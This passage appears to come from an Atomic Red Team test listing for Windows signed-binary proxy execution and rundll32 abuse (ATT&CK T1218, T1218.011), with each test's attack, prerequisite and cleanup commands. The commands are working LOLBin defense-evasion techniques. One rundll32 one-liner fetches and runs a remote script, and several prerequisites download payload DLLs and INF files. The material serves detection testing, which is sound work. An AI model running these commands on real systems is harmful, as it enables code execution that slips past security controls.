Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.i
nf"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: ProtocolHandler.exe Downloaded a Suspicious File
Atomic Test Number: 4
Atomic Test GUID: db020456-125b-4c8b-a4a7-487df8afb5a2
Description: Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
Command (with inputs):
FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  $wdApp = New-Object -COMObject "Word.Application"
  Stop-Process -Name "winword"
  exit 0 } catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Microsoft.Workflow.Compiler.exe Payload Execution
Atomic Test Number: 5
Atomic Test GUID: 7cbb0f26-a4c1-4f77-b180-a009aa05637e
Description: Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
#{mwcpath}\#{mwcname} "#{xml_payload}" output.txt
Command (with inputs):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe "C:\AtomicRedTeam\atomics\T1218\src\T1218.xml" output.txt

Dependencies:
Description: .Net must be installed for this test to work correctly.
Check Prereq Command:
if (Test-Path #{mwcpath}\#{mwcname} ) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe ) {exit 0} else {exit 1}
Get Prereq Command:
write-host ".Net must be installed for this test to work correctly."
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions
Atomic Test Number: 6
Atomic Test GUID: 4cc40fd7-87b8-4b16-b2d7-57534b86b911
Description: Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
&"#{renamed_binary}" "#{xml_payload}" output.txt
Command (with inputs):
&"C:\AtomicRedTeam\atomics\..\ExternalPayloads\svchost.exe" "C:\AtomicRedTeam\atomics\T1218\src\T1218.xml" output.txt

Dependencies:
Description: .Net must be installed for this test to work correctly.
Check Prereq Command:
if (Test-Path "#{renamed_binary}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\svchost.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Copy-Item #{mwcpath}\#{mwcname} "#{renamed_binary}" -Force
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Copy-Item C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe "C:\AtomicRedTeam\atomics\..\ExternalPayloads\svchost.exe" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Invoke-ATHRemoteFXvGPUDisablementCommand base test
Atomic Test Number: 7
Atomic Test GUID: 9ebe7901-7edf-45c0-b5c7-8366300919db
Description: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).
One of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDis
ablement.exe to execute custom PowerShell code by using a technique referred to as "PowerShell module load-order hijacking" where a module containing, in this case, an implementation
 of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or with
in a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.
Invoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supp
ly anything at the command-line. PowerShell code execution is triggered when supplying the "Disable" argument to RemoteFXvGPUDisablement.exe.
The Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.
Reference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}
Command (with inputs):
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD

Dependencies:
Description: The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.
Check Prereq Command:
$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}
Get Prereq Command:
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: DiskShadow Command Execution
Atomic Test Number: 8
Atomic Test GUID: 0e1483ba-8f0c-425d-b8c6-42736e058eaa
Description: Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshad
ow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
#{dspath} -S #{txt_payload}
Command (with inputs):
C:\Windows\System32\diskshadow.exe -S C:\AtomicRedTeam\atomics\T1218\src\T1218.txt

Dependencies:
Description: txt file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1218\src\T1218.txt)
Check Prereq Command:
if (Test-Path "#{txt_payload}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218\src\T1218.txt") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{txt_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt" -OutFile "#{txt_payload}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218\src\T1218.txt") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt" -OutFile "C:\AtomicRedTeam\atomics\T1218\src\T1218.txt"
Description: DiskShadow.exe must exist on disk at specified location (C:\Windows\System32\diskshadow.exe)
Check Prereq Command:
if (Test-Path #{dspath}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Windows\System32\diskshadow.exe) {exit 0} else {exit 1}
Get Prereq Command:
echo "DiskShadow.exe not found on disk at expected location"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Load Arbitrary DLL via Wuauclt (Windows Update Client)
Atomic Test Number: 9
Atomic Test GUID: 49fbd548-49e9-4bb7-94a6-3769613912b8
Description: This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched.  See https://dtm.uk/wuauclt/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
Command (with inputs):
wuauclt.exe /UpdateDeploymentProvider "C:\AtomicRedTeam\atomics\T1218\bin\calc.dll" /RunHandlerComServer

Cleanup Commands:
Command:
taskkill /f /im calculator.exe > nul 2>&1

Dependencies:
Description: DLL to load must exist on disk as specified location (C:\AtomicRedTeam\atomics\T1218\bin\calc.dll)
Check Prereq Command:
if (test-path "#{arbitrary_dll}"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\AtomicRedTeam\atomics\T1218\bin\calc.dll"){exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218\bin\calc.dll") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "C:\AtomicRedTeam\atomics\T1218\bin\calc.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Lolbin Gpscript logon option
Atomic Test Number: 10
Atomic Test GUID: 5bcda9cd-8e85-48fa-861d-b5a85d91d48c
Description: Executes logon scripts configured in Group Policy. https://lolbas-project.github.io/lolbas/Binaries/Gpscript/ https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-t
o-the-list/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
Gpscript /logon
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Lolbin Gpscript startup option
Atomic Test Number: 11
Atomic Test GUID: f8da74bb-21b8-4af9-8d84-f2c8e4a220e3
Description: Executes startup scripts configured in Group Policy https://lolbas-project.github.io/lolbas/Binaries/Gpscript/ https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-
to-the-list/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
Gpscript /startup
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Lolbas ie4uinit.exe use as proxy
Atomic Test Number: 12
Atomic Test GUID: 13c0804e-615e-43ad-b223-2dfbacd0b0b3
Description: Executes commands from a specially prepared ie4uinit.inf file. Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-pe
rsistence-part-2/ Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
copy "#{Path_inf}" %TEMP%\ieuinit.inf
%TEMP%\ie4uinit.exe -BaseSettings
Command (with inputs):
copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe
copy "C:\AtomicRedTeam\atomics\T1218\src\ieuinit.inf" %TEMP%\ieuinit.inf
%TEMP%\ie4uinit.exe -BaseSettings

Cleanup Commands:
Command:
del %TEMP%\ie4uinit.exe >nul 2>&1
del %TEMP%\ieuinit.inf >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: LOLBAS CustomShellHost to Spawn Process
Atomic Test Number: 13
Atomic Test GUID: b1eeb683-90bb-4365-bbc2-2689015782fe
Description: This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\windows\system32\` to `C:\temp\`, renaming `calc.exe` to `explorer.exe`. Upon exec
ution, customshellhost.exe will spawn calc.exe. Note this will only work on Windows 10 or 11. [LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/) [BishopFox](
https://bishopfox.com/blog/edr-bypass-with-lolbins)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
if (-not (Test-Path #{dest_path})) {
New-Item -Path #{dest_path} -ItemType Directory
} else {
Write-Host "Directory #{dest_path} already exists." }
Copy-Item -Path "C:\windows\system32\customshellhost.exe" -Destination "#{dest_path}\customshellhost.exe" -Force
Copy-Item -Path "C:\windows\system32\calc.exe" -Destination "#{dest_path}\explorer.exe" -Force
#{dest_path}\customshellhost.exe
Command (with inputs):
if (-not (Test-Path C:\test)) {
New-Item -Path C:\test -ItemType Directory
} else {
Write-Host "Directory C:\test already exists." }
Copy-Item -Path "C:\windows\system32\customshellhost.exe" -Destination "C:\test\customshellhost.exe" -Force
Copy-Item -Path "C:\windows\system32\calc.exe" -Destination "C:\test\explorer.exe" -Force
C:\test\customshellhost.exe

Cleanup Commands:
Command:
Remove-Item -Path #{dest_path} -Recurse -Force
Command (with inputs):
Remove-Item -Path C:\test -Recurse -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Provlaunch.exe Executes Arbitrary Command via Registry Key
Atomic Test Number: 14
Atomic Test GUID: ab76e34f-28bf-441f-a39c-8db4835b89cc
Description: Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary 
command. - https://twitter.com/0gtweet/status/1674399582162153472 - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/ Registry keys are deleted after successful execution.


Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
c:\windows\system32\provlaunch.exe LOLBin
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 execute JavaScript Remote Payload With GetObject
Atomic Test Number: 1
Atomic Test GUID: 57ba4ce9-ee7a-4f27-9928-3c70c489b59d
Description: Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.  This has been used by Win32/Poweliks malware and works as described [he
re](https://www.stormshield.com/news/poweliks-command-line-confusion/)
Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
Command (with inputs):
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src
/T1218.011.sct").Exec();window.close();

Cleanup Commands:
Command:
taskkill /IM notepad.exe /f
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 execute VBscript command
Atomic Test Number: 2
Atomic Test GUID: 638730e7-7aed-43dc-bf8c-8117f805f5bb
Description: Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test. Technique documented by Hexacorn- http://www.hexacorn.com/blog/20
19/10/29/rundll32-with-a-vbscript-protocol/ Upon execution calc.exe will be launched

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
Command (with inputs):
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 execute VBscript command using Ordinal number
Atomic Test Number: 3
Atomic Test GUID: 32d1cf1b-cbc2-4c09-8d05-07ec5c83a821
Description: Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test. Technique documented by Hexacorn- http://www.hexacorn.com/blog/20
19/10/29/rundll32-with-a-vbscript-protocol/ Upon execution calc.exe will be launched

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
Command (with inputs):
rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 advpack.dll Execution
Atomic Test Number: 4
Atomic Test GUID: d91cae26-7fc1-457b-a854-34c8aad48c89
Description: Test execution of a command using rundll32.exe with advpack.dll. Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml Upon executi
on calc.exe will be launched

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
Command (with inputs):
rundll32.exe advpack.dll,LaunchINFSection "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,

Dependencies:
Description: Inf file must exist on disk at specified location ("C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf")
Check Prereq Command:
if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 ieadvpack.dll Execution
Atomic Test Number: 5
Atomic Test GUID: 5e46a58e-cbf6-45ef-a289-ed7754603df9
Description: Test execution of a command using rundll32.exe with ieadvpack.dll. Upon execution calc.exe will be launched
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
Command (with inputs):
rundll32.exe ieadvpack.dll,LaunchINFSection "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,

Dependencies:
Description: Inf file must exist on disk at specified location ("C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf")
Check Prereq Command:
if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 syssetup.dll Execution
Atomic Test Number: 6
Atomic Test GUID: 41fa324a-3946-401e-bbdd-d7991c628125
Description: Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "#{inf_to_execute}"
Command (with inputs):
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"

Dependencies:
Description: Inf file must exist on disk at specified location ("C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf")
Check Prereq Command:
if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "C:\AtomicRedTeam\atomics\T1218.011\src\T121
8.011_DefaultInstall.inf"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 setupapi.dll Execution
Atomic Test Number: 7
Atomic Test GUID: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
Description: Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
Command (with inputs):
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"

Dependencies:
Description: Inf file must exist on disk at specified location ("C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf")
Check Prereq Command:
if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "C:\AtomicRedTeam\atomics\T1218.011\src\T121
8.011_DefaultInstall.inf"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Execution of HTA and VBS Files using Rundll32 and URL.dll
Atomic Test Number: 8
Atomic Test GUID: 22cfde89-befe-4e15-9753-47306b37a6e3
Description: IcedID uses this TTP as follows:   rundll32.exe url.dll,OpenURL %PUBLIC%\index.hta Trickbot uses this TTP as follows:   rundll32.exe URL.dll,FileProtocolHandler C:\\..\\
Detail\\akteullen.vbs
In this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with "rundll32 spawned wscript"

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe url.dll,OpenURL "PathToAtomicsFolder\T1218.011\src\index.hta"
rundll32.exe URL.dll,FileProtocolHandler "PathToAtomicsFolder\T1218.011\src\akteullen.vbs"
Command (with inputs):
rundll32.exe url.dll,OpenURL "C:\AtomicRedTeam\atomics\T1218.011\src\index.hta"
rundll32.exe URL.dll,FileProtocolHandler "C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Launches an executable using Rundll32 and pcwutl.dll
Atomic Test Number: 9
Atomic Test GUID: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
Description: Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
Command (with inputs):
rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Execution of non-dll using rundll32.exe
Atomic Test Number: 10
Atomic Test GUID: ae3a8605-b26e-457c-b6b3-2702fd335bac
Description: Rundll32.exe running non-dll

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
rundll32.exe #{input_file}, StartW
Command (with inputs):
rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW

Dependencies:
Description: Non-dll file must exist on disk at specified location
Check Prereq Command:
if (Test-Path #{input_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Users\$env:username\Downloads\calc.png) {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll" -OutFile "C:\Users\$env:username\Downloads\calc.png"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 with Ordinal Value
Atomic Test Number: 11
Atomic Test GUID: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
Description: Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer.  Upon successful execution, Calc.exe will spawn.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe "#{input_file}",#2
Command (with inputs):
rundll32.exe "C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx64.dll",#2

Dependencies:
Description: DLL file must exist on disk at specified location
Check Prereq Command:
if (Test-Path "#{input_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx64.dll") {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll" -OutFile "C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThings
x64.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 with Control_RunDLL
Atomic Test Number: 12
Atomic Test GUID: e4c04b6f-c492-4782-82c7-3bf75eb8077e
Description: Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
Command (with inputs):
rundll32.exe shell32.dll,Control_RunDLL "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"

Dependencies:
Description: DLL file must exist on disk at specified location
Check Prereq Command:
if (Test-Path "#{input_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll") {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
Get Prereq Command (with inputs):
